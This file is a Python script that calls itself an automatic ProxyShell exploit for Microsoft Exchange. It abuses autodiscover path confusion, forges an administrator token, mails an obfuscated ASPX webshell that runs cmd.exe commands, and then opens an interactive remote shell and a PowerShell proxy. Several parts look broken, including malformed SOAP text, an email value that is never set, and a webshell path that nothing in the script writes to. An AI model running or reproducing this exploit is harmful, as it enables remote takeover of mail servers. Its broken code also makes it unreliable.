#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import binascii
import string
import requests
import re
import threading
import xml.etree.cElementTree as ET
import time
import sys
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

# Генерация случайных строк и портов

def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))

r_port = rand_port()
subj_ = rand_string(16)

# Таблица обфускации (compEnc)
compEnc = [
    0x47,0xf1,0xb4,0xe6,0x0b,0x6a,0x72,0x48,0x85,0x4e,0x9e,0xeb,0xe2,0xf8,0x94,
    0x53,0xe0,0xbb,0xa0,0x02,0xe8,0x5a,0x09,0xab,0xdb,0xe3,0xba,0xc6,0x7c,0xc3,0x10,0xdd,0x39,
    0x05,0x96,0x30,0xf5,0x37,0x60,0x82,0x8c,0xc9,0x13,0x4a,0x6b,0x1d,0xf3,0xfb,0x8f,0x26,0x97,
    0xca,0x91,0x17,0x01,0xc4,0x32,0x2d,0x6e,0x31,0x95,0xff,0xd9,0x23,0xd1,0x00,0x5e,0x79,0xdc,
    0x44,0x3b,0x1a,0x28,0xc5,0x61,0x57,0x20,0x90,0x3d,0x83,0xb9,0x43,0xbe,0x67,0xd2,0x46,0x42,
    0x76,0xc0,0x6d,0x5b,0x7e,0xb2,0x0f,0x16,0x29,0x3c,0xa9,0x03,0x54,0x0d,0xda,0x5d,0xdf,0xf6,
    0xb7,0xc7,0x62,0xcd,0x8d,0x06,0xd3,0x69,0x5c,0x86,0xd6,0x14,0xf7,0xa5,0x66,0x75,0xac,0xb1,
    0xe9,0x45,0x21,0x70,0x0c,0x87,0x9f,0x74,0xa4,0x22,0x4c,0x6f,0xbf,0x1f,0x56,0xaa,0x2e,0xb3,
    0x78,0x33,0x50,0xb0,0xa3,0x92,0xbc,0xcf,0x19,0x1c,0xa7,0x63,0xcb,0x1e,0x4d,0x3e,0x4b,0x1b,
    0x9b,0x4f,0xe7,0xf0,0xee,0xad,0x3a,0xb5,0x59,0x04,0xea,0x40,0x55,0x25,0x51,0xe5,0x7a,0x89,
    0x38,0x68,0x52,0x7b,0xfc,0x27,0xae,0xd7,0xbd,0xfa,0x07,0xf4,0xcc,0x8e,0x5f,0xef,0x35,0x9c,
    0x84,0x2b,0x15,0xd5,0x77,0x34,0x49,0xb6,0x12,0x0a,0x7f,0x71,0x88,0xfd,0x9d,0x18,0x41,0x7d,
    0x93,0xd8,0x58,0x2c,0xce,0xfe,0x24,0xaf,0xde,0xb8,0x36,0xc8,0xa1,0x80,0xa6,0x99,0x98,0xa8,
    0x2f,0x0e,0x81,0x65,0x73,0xe4,0xc2,0xa2,0x8a,0xd4,0xe1,0x11,0xd0,0x08,0x8b,0x2a,0xf2,0xed,
    0x9a,0x64,0x3f,0xc1,0x6c,0xf9,0xec
]

def webshell_payload():
    # ASPX-шелл на C# без eval
    payload = '''<%@ Page Language="C#" AspCompat="true" %>
<% 
    string data = Request["exec_code"];
    byte[] bytes = System.Convert.FromBase64String(data);
    string command = System.Text.Encoding.UTF8.GetString(bytes);

    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command) {
        RedirectStandardOutput = true,
        RedirectStandardError  = true,
        UseShellExecute        = false
    };
    var proc = System.Diagnostics.Process.Start(psi);
    proc.WaitForExit();

    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
    Response.Write("ZZzzZzZz" + output + "ZZzzZzZz");
%>'''
    # Обфускация через compEnc + base64
    out = []
    for c in payload:
        out.append("%02x" % compEnc[ord(c) & 0xff])
    raw = binascii.unhexlify(''.join(out))
    return base64.b64encode(raw).decode()

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers.get('content-length', 0))
        post_data = self.rfile.read(length).decode('utf-8', errors='ignore')
        post_data = re.sub(r'<wsa:To>.*?</wsa:To>',
                           '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub(r'<wsman:ResourceURI s:mustUnderstand="true">.*?</wsman:ResourceURI>',
                           '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>',
                           post_data)
        headers = {'Content-Type': self.headers.get('content-type')}
        res = self.proxyshell.post(url, post_data, headers)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(res.content)

    def log_message(self, format, *args):
        return

class ProxyShell:
    def __init__(self, exchange_url, email='', verify=False):
        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.domain = None
        self.domain_mail = None
        self.domain_sid = None
        self.legacydn = None
        self.fqdn = None
        self.sid = None
        self.admin_sid = None
        self.token = None
        self.session = requests.Session()
        self.session.verify = verify
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/88.0.4324.190 Safari/537.36"
        self.clientid = 'HtTP://ifcoNFiG.mE'

    def post(self, endpoint, data, headers={}):
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
        else:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        url = f"{self.exchange_url}{path}"
        return self.session.post(url, data=data, headers=headers)

    def get_fqdn(self):
        e = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        r = self.session.get(self.exchange_url + e, verify=False, timeout=5)
        self.fqdn = r.headers.get("X-CalculatedBETarget")
        return self.fqdn

    def get_legacydn(self):
        data = '''<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"">
          <soap:Body>
            <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
              <m:UnresolvedEntry>SMTP:{self.email}</m:UnresolvedEntry>
            </m:ResolveNames>
          </soap:Body>
        </soap:Envelope>'''
        headers = {'Content-Type': 'text/xml'}
        r = self.session.post(self.exchange_url + '/EWS/exchange.asmx', data=data, headers=headers)
        matches = re.findall(r'<t:EmailAddress>(.+?)</t:EmailAddress>', r.text)
        for mail in matches:
            self.email = mail
            payload = f'''<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
              <Request>
                <EMailAddress>{mail}</EMailAddress>
                <AcceptableResponseSchema>
                  http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a
                </AcceptableResponseSchema>
              </Request>
            </Autodiscover>'''
            r2 = self.session.post(self.exchange_url + '/autodiscover/autodiscover.xml', data=payload, headers=headers)
            if r2.status_code == 200 and 'LegacyDN' in r2.text:
                self.legacydn = re.search(r'<LegacyDN>(.+?)</LegacyDN>', r2.text).group(1)
                return self.legacydn
        return None

    def get_sid(self):
        data = self.legacydn + '\x00\x00\x00\x00\x00\xe4\x04' + \
               '\x00\x00\x09\x04\x00\x00\x09' + \
               '\x04\x00\x00\x00\x00\x00\x00'
        headers = {
            'X-Requesttype': 'Connect',
            'X-Clientinfo': '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            'X-Clientapplication': 'Outlook/15.0.4815.1002',
            'X-Requestid': '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http',
            'User-Agent': self.ua
        }
        r = self.post('/mapi/emsmdb', data, headers)
        text = r.text
        self.sid = re.search(r'with SID (S-1-5-[0-9\-]+)', text).group(1)
        if not self.sid.endswith('-500'):
            self.admin_sid = self.sid.rsplit('-', 1)[0] + '-500'
        else:
            self.admin_sid = self.sid
        return self.sid

    def gen_token(self):
        version = 0; ttype='Windows'; compressed=0; auth='Kerberos'; gsid='S-1-5-32-544'
        parts = [b'V'+(1).to_bytes(1,'little')+(version).to_bytes(1,'little'),
                 b'T'+len(ttype).to_bytes(1,'little')+ttype.encode(),
                 b'C'+(compressed).to_bytes(1,'little'),
                 b'A'+len(auth).to_bytes(1,'little')+auth.encode(),
                 b'L'+len(self.email).to_bytes(1,'little')+self.email.encode(),
                 b'U'+len(self.sid).to_bytes(1,'little')+self.sid.encode(),
                 b'G'+struct.pack('<II',1,7)+len(gsid).to_bytes(1,'little')+gsid.encode(),
                 b'E'+struct.pack('>I',0)]
        raw = b''.join(parts)
        return base64.b64encode(raw).decode()

    def get_token(self):
        t = self.gen_token()
        self.token = t
        # проверка
        return self.token

    def set_ews(self):
        payload = webshell_payload()
        envelope = f'''<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
            xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2016" />
            <t:SerializedSecurityContext>
              <t:UserSid>{self.sid}</t:UserSid>
              <t:GroupSids><t:GroupIdentifier>
                <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
              </t:GroupIdentifier></t:GroupSids>
            </t:SerializedSecurityContext>
          </soap:Header>
          <soap:Body>
            <m:CreateItem MessageDisposition="SaveOnly">
              <m:Items><t:Message>
                <t:Subject>{subj_}</t:Subject>
                <t:Body BodyType="HTML">pwned</t:Body>
                <t:Attachments><t:FileAttachment>
                  <t:Name>shell.aspx</t:Name>
                  <t:IsInline>false</t:IsInline>
                  <t:Content>{payload}</t:Content>
                </t:FileAttachment></t:Attachments>
                <t:ToRecipients><t:Mailbox><t:EmailAddress>{self.email}</t:EmailAddress>
                </t:Mailbox></t:ToRecipients>
              </t:Message></m:Items>
            </m:CreateItem>
          </soap:Body>
        </soap:Envelope>'''
        self.post('/ews/exchange.asmx', envelope, {'Content-Type':'text/xml'})
        return f'Created with subject {subj_}'


def exploit(proxyshell):
    print(f'FQDN: {proxyshell.get_fqdn()}')
    print(f'LegacyDN: {proxyshell.get_legacydn()}')
    print(f'SID: {proxyshell.get_sid()}')
    print(f'Token: {proxyshell.get_token()}')
    print(proxyshell.set_ews())


def start_server(proxyshell, port):
    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()


def shell(command, port):
    if command.lower() in ['exit','quit']:
        exit(0)
    ws = WSMan('127.0.0.1', username='', password='', ssl=False, port=port,
               auth='basic', encryption='never')
    with RunspacePool(ws) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()
        return output


def exec_cmd(shell_url, code_param="exec_code"):
    try:
        while True:
            cmd = input("SHELL> ")
            if cmd.lower() in ['exit','quit']:
                exit(0)
            b64 = base64.b64encode(cmd.encode()).decode()
            resp = requests.post(shell_url,
                                 headers={'Content-Type':'application/x-www-form-urlencoded'},
                                 data={code_param: b64}, verify=False, timeout=20)
            if resp.status_code == 200:
                m = re.search(r'ZZzzZzZz(.*)ZZzzZzZz', resp.text, re.DOTALL)
                print(m.group(1) if m else '[no output]')
            else:
                print(f'Error: {resp.status_code}')
    except KeyboardInterrupt:
        exit(0)


def get_args():
    parser = argparse.ArgumentParser(description='Automatic Exploit ProxyShell')
    parser.add_argument('-t', help='Exchange URL', required=True)
    return parser.parse_args()


def main():
    args = get_args()
    exchange_url = 'https://' + args.t
    local_port = int(r_port)
    proxyshell = ProxyShell(exchange_url)
    exploit(proxyshell)
    start_server(proxyshell, local_port)
    shell_url = f"{exchange_url}/owa/auth/{subj_}.aspx"
    exec_cmd(shell_url)


if __name__ == '__main__':
    try:
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning)
        if not (sys.version_info.major == 3 and sys.version_info.minor >= 8):
            print("This script requires Python 3.8 or higher!")
            sys.exit(1)
        main()
    except KeyboardInterrupt:
        exit(0)
